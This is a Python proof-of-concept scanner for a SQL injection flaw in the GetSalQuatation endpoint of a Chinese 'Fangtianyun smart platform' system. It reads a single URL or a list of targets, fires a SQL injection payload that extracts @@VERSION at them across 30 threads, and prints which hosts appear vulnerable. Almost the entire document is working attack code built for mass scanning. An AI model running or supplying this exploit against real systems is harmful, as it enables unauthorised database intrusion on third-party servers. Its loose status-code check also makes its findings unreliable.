import requests
from multiprocessing.dummy import Pool
import argparse

def main():
    parse = argparse.ArgumentParser(description="方天云智慧平台系统 GetSalQuatation SQL注入漏洞")
    parse.add_argument('-u', '--url', dest='url', type=str, help='Please input url')
    parse.add_argument('-f', '--file', dest='file', type=str, help='Please input file')
    args = parse.parse_args()
    try:
        if args.url:
            check(args.url)
        else:
            targets = []
            f = open(args.file, 'r+')
            for i in f.readlines():
                target = i.strip()
                if 'http' in i:
                    targets.append(target)
                else:
                    target = f"http://{i}"
                    targets.append(target)
            pool = Pool(30)
            pool.map(check, targets)
    except Exception as s:
        print('[error]请输入-h查看帮助信息')
def check(target):
    url = f'{target}/AjaxMethods.asmx/GetSalQuatation'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Content-Type':'application/json',
    }
    data = {
        'ID':'"(SELECT CHAR(113)+CHAR(120)+CHAR(122)+CHAR(112)+CHAR(113)+(CASE WHEN (8725=8725) THEN @@VERSION ELSE CHAR(48) END)+CHAR(113)+CHAR(122)+CHAR(118)+CHAR(106)+CHAR(113))"'
    }
    response = requests.post(url=url, headers=headers, verify=False,data=data,timeout=3)
    try:
        if response.status_code == 500 and 'Message' in response.text:
            print(f'存在漏洞 {url}')
        else:
             print(f'不存在漏洞  {url}')
    except Exception as e:
        print(f"[timeout] {url}")

if __name__ == '__main__':
    main()